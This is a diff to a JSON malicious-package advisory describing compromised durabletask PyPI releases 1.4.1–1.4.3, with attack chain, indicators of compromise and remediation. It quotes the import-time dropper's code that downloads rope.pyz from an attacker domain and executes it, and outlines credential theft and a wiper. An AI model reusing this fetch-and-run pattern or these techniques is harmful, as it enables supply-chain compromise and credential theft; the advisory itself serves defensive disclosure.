@@ -1,10 +1,10 @@
 {
-  "modified": "2026-05-19T22:33:24Z",
+  "modified": "2026-06-08T19:21:16Z",
   "published": "2026-05-19T16:47:48Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-4174",
   "summary": "Malicious code in durabletask (PyPI)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (78c753d3badef7f806bd71d60c2bb890ccc969a3fb360596e2872ae580d135f8)\nCompromised release of Microsoft's Durable Task SDK. Stage-1 dropper in __init__.py downloads and executes a credential-stealing zipapp from check.git-service.com on Linux at import time.\n\n## Source: kam193 (9c23380bb017a417e3f26575c5b96e32fb0bf11dec8314d16f8b979052748049)\nVersions 1.4.1, 1.4.2, 1.4.3 were compromised.\n\n\nDuring import of compromised versions, the malicious code is downloaded and executed. It exfiltrates all kinds of credentials and sensitive files, including data from secret and password managers, SSH keys, configuration files. Code tries to achieve a persistence via systemd unit.\n\n\n---\n\nCategory: MALICIOUS - The campaign has clearly malicious intent, like infostealers.\n\n\nCampaign: 2026-05-compr-durabletask\n\n\nReasons (based on the campaign):\n\n\n - files-exfiltration\n\n\n - exfiltration-env-variables\n\n\n - exfiltration-ssh-keys\n\n\n - exfiltration-cloud-tokens\n\n\n - Downloads and executes a remote malicious script.\n\n\n - exfiltration-credentials\n\n\n - persistence\n\n\n - compromised-package\n",
+  "details": "**1.4.1**, **1.4.2**, and **1.4.3** of `durabletask` were compromised via a **PyPI maintainer account takeover**. All three malicious versions were published on 2026-05-19 within a 35-minute window (16:19–16:54 UTC). Pin to `\u003c=1.4.0`.\n\n**Attack chain**\n\n- *Stage 1 — Import-time dropper:* on import, the package fetches a second-stage payload `rope.pyz` from `check.git-service.com` (`160.119.64.3`). The TLS certificate for this C2 was issued on 2026-05-16, indicating ~3 days of pre-attack staging.\n- *Stage 2 — Credential-theft framework:*\n  - AWS / Azure / GCP IMDS interrogation and Secrets Manager dumps\n  - Kubernetes lateral movement via in-cluster service-account tokens\n  - HashiCorp Vault token extraction\n  - Harvesting from 85 known filesystem credential paths\n  - Brute-forcing of local password manager vaults\n- *Exfiltration:* stolen data is encrypted and shipped to the primary C2, with a **dead-drop fallback** that pushes encrypted blobs as GitHub commits (FIRESCALE-style egress).\n- *Persistence:* systemd unit `pgsql-monitor.service`.\n- *Destructive payload:* a **geotargeted wiper** activates on hosts identified as being located in **Israel** or **Iran**.\n\n**Indicators of compromise**\n\n- C2 (primary): `check.git-service.com` — `160.119.64.3`\n- C2 (secondary): `t.m-kosche.com` — `185.95.159.32`\n- Dropped payload: `rope.pyz`\n- Persistence unit: `pgsql-monitor.service`\n\n**Recommended actions**\n\n- Pin `durabletask` to `\u003c=1.4.0`.\n- Block both C2 domains at network egress.\n- Treat any Linux system that imported 1.4.1 / 1.4.2 / 1.4.3 as **fully compromised** — rotate all reachable secrets and rebuild affected hosts.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (daa176998359c04f9e002ff27fa947f12f08ddf49648ac7444ca894602317662)\nOn every `import durabletask`, the package's top-level `__init__.py` (lines 8-11) calls `urllib.request.urlretrieve('https://check.git-service.com/rope.pyz', '/tmp/managed.pyz')` and then `subprocess.Popen(['python3', '/tmp/managed.pyz'], start_new_session=True)` on Linux. The fetched zipapp is executed with no hash or signature verification, in a detached session. The destination `check.git-service.com` is a generic-git-service lookalike domain unrelated to the legitimate publisher of durabletask (Microsoft / microsoft/durabletask-python on github.com). The trigger is module import — not `pip install` — so install-phase sandboxes (`pip download`, `pip wheel`, build isolation) never observe the network activity; the dropper fires when the package is loaded in CI, production, or a developer's interpreter. The pattern (plaintext additive trailing block in `__init__.py`, Linux platform gate, `.pyz` staged to `/tmp/` and handed to `python3`, lookalike `git-\u003cproject\u003e.com`-style C2) matches a known import-time dropper campaign and is structurally indistinguishable from a stolen-publish-credential compromise of a legitimate package.\n\n## Source: kam193 (9c23380bb017a417e3f26575c5b96e32fb0bf11dec8314d16f8b979052748049)\nVersions 1.4.1, 1.4.2, 1.4.3 were compromised.\n\n\nDuring import of compromised versions, the malicious code is downloaded and executed. It exfiltrates all kinds of credentials and sensitive files, including data from secret and password managers, SSH keys, configuration files. Code tries to achieve a persistence via systemd unit.\n\n\n---\n\nCategory: MALICIOUS - The campaign has clearly malicious intent, like infostealers.\n\n\nCampaign: 2026-05-compr-durabletask\n\n\nReasons (based on the campaign):\n\n\n - files-exfiltration\n\n\n - exfiltration-env-variables\n\n\n - exfiltration-ssh-keys\n\n\n - exfiltration-cloud-tokens\n\n\n - Downloads and executes a remote malicious script.\n\n\n - exfiltration-credentials\n\n\n - persistence\n\n\n - compromised-package\n",
   "affected": [
     {
       "package": {
@@ -18,6 +18,11 @@
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -82,7 +87,7 @@
   ],
   "references": [
     {
-      "type": "WEB",
+      "type": "REPORT",
       "url": "https://safedep.io/malicious-durabletask-pypi-supply-chain-attack"
     },
     {
@@ -100,6 +105,10 @@
     {
       "type": "WEB",
       "url": "https://www.aikido.dev/blog/durabletask-package-compromised-mini-shai-hulud"
+    },
+    {
+      "type": "WEB",
+      "url": "https://safedep.io/malicious-durabletask-pypi-supply-chain-attack"
     }
   ],
   "credits": [
@@ -116,6 +125,13 @@
       "contact": [
         "https://github.com/kam193",
         "https://bad-packages.kam193.eu/"
+      ]
+    },
+    {
+      "name": "SafeDep",
+      "type": "FINDER",
+      "contact": [
+        "https://safedep.io"
       ]
     }
   ],
@@ -184,6 +200,28 @@
         "import_time": "2026-05-19T22:31:50.76999664Z",
         "id": "pypi/2026-05-compr-durabletask/durabletask",
         "modified_time": "2026-05-19T18:34:41Z",
+        "versions": [
+          "1.4.1",
+          "1.4.2",
+          "1.4.3"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "daa176998359c04f9e002ff27fa947f12f08ddf49648ac7444ca894602317662",
+        "import_time": "2026-05-26T05:50:53.879999909Z",
+        "id": "IN-MAL-2026-003579",
+        "modified_time": "2026-05-20T17:45:34Z",
+        "versions": [
+          "1.4.1"
+        ]
+      },
+      {
+        "source": "kam193",
+        "sha256": "48304d20771195ab837cc038cbcd5efd2552d123b890df0dc57ccef477b7ee5d",
+        "import_time": "2026-06-08T19:19:19.170034188Z",
+        "id": "pypi/2026-05-compr-durabletask/durabletask",
+        "modified_time": "2026-05-19T18:35:31Z",
         "versions": [
           "1.4.1",
           "1.4.2",
